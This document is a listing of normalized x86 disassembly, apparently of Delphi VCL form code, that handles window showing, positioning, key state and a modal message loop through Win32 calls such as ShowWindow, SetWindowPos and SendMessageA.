call sub_45bd8c
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_460504
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_46056c
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_46056c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_45bdc4
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_418ddc
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_43fedc
lea eax [ ebp - 0x1c ]
call sub_406d5c
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_46049c
test [ esi + 0x228 ] 0x8
je r-xdata
sub_45bf58
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_45bfcc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_45bff6
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445148
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45a008
lea edx [ ebp - 0x14 ]
call sub_45d7d0
push ebp
mov eax [ ebp - 0x4 ]
call sub_45a008
lea edx [ ebp - 0x24 ]
call sub_45d7d0
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_45bfcc
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_45a008
lea edx [ ebp - 0x24 ]
call sub_45d7d0
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_45bfcc
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45bfcc
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_45bfcc
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_45c0b0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403448
pop esi
pop ebx
retn
sub_45c0d4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403448
pop esi
pop ebx
retn
sub_45c0f8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_446028
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_447118
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_447118
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45c192
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45c6fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_460950
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_45c6e1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c6e8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
push ebp
push j_sub_4036ec#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_4036ec#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b340
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_444104
jmp r-xdata
mov eax [ rw-data ]
call sub_45da2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43fdc8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_446be4
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_45da20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43fe0c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_446be4
call sub_456fa4
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45da5c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43fdc8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45da2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_440624
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45da50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43fe0c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45da20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45a5f0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45a5f0
jmp r-xdata
sub_45c251
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_460064
call sub_403a54
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_45da2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43fdc8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45da20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43fe0c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45da5c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43fdc8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45da2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c6e8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_440624
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45da50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43fe0c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45da20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45a5f0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45a5f0
jmp r-xdata
sub_45c5ed
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_460064
call sub_403a54
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b340
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_444104
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_446be4
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c6e8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_446be4
call sub_456fa4
mov ebx eax
sub_45c734
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_45c78a
mov eax eax
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d80
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45c7ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_45c7f8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403448
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45c824
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_460050
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403448
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45c9c4
jmp r-xdata
mov eax ebx
call sub_45ca60
mov dl 0x1
mov eax ebx
call sub_45a5b0
jmp r-xdata
sub_45c8c8
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_459f3c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_459f88
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_45c92c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45c998
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403448
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ca60
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45c9e4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45ca52
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ca59
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_45b23c
sub_45ca7c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45cd44
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43ec24
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_45ef1c
xor edx edx
push ebp
push sub_45cd27
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_41a2b4
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_45df4c
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_456e54
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45cd05
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_45c9cc
xor edx edx
push ebp
push sub_45cc64
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
